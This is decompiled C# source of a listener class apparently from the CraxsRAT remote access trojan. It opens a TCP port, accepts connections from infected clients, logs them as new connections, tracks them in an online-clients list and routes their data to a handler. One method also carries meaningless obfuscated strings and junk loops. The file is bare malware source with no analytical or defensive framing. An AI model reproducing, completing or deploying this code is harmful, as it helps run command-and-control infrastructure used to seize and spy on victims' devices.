using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000CD RID: 205
public class Accept
{
	// Token: 0x060008CA RID: 2250 RVA: 0x000CFAAC File Offset: 0x000CDCAC
	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokygbhs(string PORTt)
	{
		try
		{
			this.randomnumber = new Random();
			this.SyncObj = this.RequestsReceiver;
			this.Syncrecive = RuntimeHelpers.GetObjectValue(new object());
			this.RequestsReceiver = new List<ListData>();
			int num = Conversions.ToInteger(PORTt);
			if (this.CheckPort(num))
			{
				this.Myport = Conversions.ToString(num);
				this.MainListner = new TcpListener(IPAddress.Any, num);
				this.MainListner.Server.SendTimeout = -1;
				this.MainListner.Server.ReceiveTimeout = -1;
				this.MainListner.Server.SendBufferSize = 16384;
				this.MainListner.Server.ReceiveBufferSize = 16384;
				this.MainListner.Start();
				new Thread(new ThreadStart(this.ScanerAsync))
				{
					IsBackground = true
				}.Start();
				new Thread(new ThreadStart(this.DataHandlerAsync))
				{
					IsBackground = true,
					Name = "DataHandel"
				}.Start();
				this.closing = false;
			}
			else
			{
				Codes.MyMsgBox("Port in use", "The specified port (" + PORTt + ") is already in use", false, Resources.information48px);
				Environment.Exit(0);
			}
			infoServer.PORTS = infoServer.PORTS + PORTt + " ";
		}
		catch (Exception ex)
		{
			Codes.MyMsgBox(PORTt + "- ERROR", "Exception while opening Port: " + PORTt, false, Resources.error48px);
		}
	}

	// Token: 0x060008CB RID: 2251 RVA: 0x000CFC50 File Offset: 0x000CDE50
	public Accept(string Paramaterp)
	{
		this.closing = true;
		this.Blocklist = new List<string>();
		this.RequestsReceiver = new List<ListData>();
		this.SocketHandler = new ManualResetEvent(false);
		this.iamout = false;
		this.Myport = "";
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsokygbhs(Paramaterp);
	}

	// Token: 0x060008CC RID: 2252 RVA: 0x000CFCA8 File Offset: 0x000CDEA8
	public void ScanerAsync()
	{
		while (Data.MainForm.Alive)
		{
			try
			{
				Thread.Sleep(1);
				this.SocketHandler.Reset();
				this.MainListner.BeginAcceptTcpClient(new AsyncCallback(this.AcceptClient), this.MainListner);
				this.SocketHandler.WaitOne();
			}
			catch (SocketException ex)
			{
				this.iamout = true;
				break;
			}
			catch (Exception ex2)
			{
				this.iamout = true;
				break;
			}
		}
	}

	// Token: 0x060008CD RID: 2253 RVA: 0x000CFD4C File Offset: 0x000CDF4C
	private void AcceptClient(IAsyncResult ar)
	{
		try
		{
			Client client = new Client(this.MainListner.EndAcceptTcpClient(ar), ((IPEndPoint)this.MainListner.LocalEndpoint).Port, this);
			if (!Data.ClientsOnline.Contains(client.ClientRemoteAddress))
			{
				Data.LOGIT(client, "New Connection", client.Flag);
				Data.ClientsOnline.Add(new object[]
				{
					client,
					client.myClient
				}, client.ClientRemoteAddress, null, null);
			}
		}
		catch (ObjectDisposedException ex)
		{
		}
		catch (SocketException ex2)
		{
		}
		catch (Exception ex3)
		{
		}
		try
		{
			Thread.Sleep(1);
			this.SocketHandler.Set();
		}
		catch (Exception ex4)
		{
		}
	}

	// Token: 0x060008CE RID: 2254 RVA: 0x000CFE54 File Offset: 0x000CE054
	private void DataHandlerAsync()
	{
		while (!this.iamout)
		{
			Thread.Sleep(1);
			ListData listData = null;
			object objectValue = RuntimeHelpers.GetObjectValue(this.SyncObj);
			try
			{
				object obj = objectValue;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj);
				lock (obj)
				{
					if (this.RequestsReceiver.Count > 0)
					{
						listData = this.RequestsReceiver[0];
						this.RequestsReceiver.RemoveAt(0);
					}
				}
				if (listData != null)
				{
					Data.HandelData(new object[]
					{
						listData.ClassClient,
						listData.bByte,
						listData.SizeData,
						listData.TcpClient
					});
					listData.wait = true;
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008CF RID: 2255 RVA: 0x000CFF3C File Offset: 0x000CE13C
	private bool CheckPort(int Port)
	{
		IPGlobalProperties ipglobalProperties = IPGlobalProperties.GetIPGlobalProperties();
		IPEndPoint[] activeTcpListeners = ipglobalProperties.GetActiveTcpListeners();
		foreach (IPEndPoint ipendPoint in activeTcpListeners)
		{
			if (ipendPoint.Port == Port)
			{
				return false;
			}
		}
		return true;
	}

	// Token: 0x060008D0 RID: 2256 RVA: 0x000CFF88 File Offset: 0x000CE188
	internal static string CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdfc(string v, string v2, int v1)
	{
		string result = null;
		try
		{
			string text;
			do
			{
				text = "+w3YoxSWNZ0Rao4T6OreWKbHMmAdzVJVQ==";
			}
			while (text.Length <= 0);
			string text2;
			do
			{
				text2 = "+RrXZvX6AX1gSq5+FNT8TKi65VQFdV/leEI0IssR8Z8cDwoRQBykIEzLM2JRqxqI4dOOw";
			}
			while (text2.Length <= 0);
			string text3;
			do
			{
				text3 = "tpVQSHwKWyrRRP8y/MjT40wyvBon5BUJlFmXnmfxxXI7JSNtXrg402Do3TZ5dQy6+27jBpFFKYsa";
			}
			while (text3.Length <= 0);
			string text4;
			do
			{
				text4 = "powIOhya6FOraSJcI0RX9yEoa2JizSwp456QM2Rwp2npbto2mhmdioUbcCloGApotMu0DY37Hrn5";
			}
			while (text4.Length <= 0);
			string text5;
			do
			{
				text5 = "+v3NbvUF6nN0U6oG4LjAyY4pIWnBT69ZqWhIdafGdNV7O1BSPdbeymud4SP/MpmeUgXOreD";
			}
			while (text5.Length <= 0);
			while (v2.Length <= 0)
			{
			}
			result = v2;
			return result;
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x04000D32 RID: 3378
	public bool closing;

	// Token: 0x04000D33 RID: 3379
	public TcpListener MainListner;

	// Token: 0x04000D34 RID: 3380
	public List<string> Blocklist;

	// Token: 0x04000D35 RID: 3381
	public List<ListData> RequestsReceiver;

	// Token: 0x04000D36 RID: 3382
	public long BytesSent;

	// Token: 0x04000D37 RID: 3383
	public long BytesReceived;

	// Token: 0x04000D38 RID: 3384
	public ManualResetEvent SocketHandler;

	// Token: 0x04000D39 RID: 3385
	public Random randomnumber;

	// Token: 0x04000D3A RID: 3386
	public bool iamout;

	// Token: 0x04000D3B RID: 3387
	public string Myport;

	// Token: 0x04000D3C RID: 3388
	public object SyncObj;

	// Token: 0x04000D3D RID: 3389
	public object Syncrecive;
}
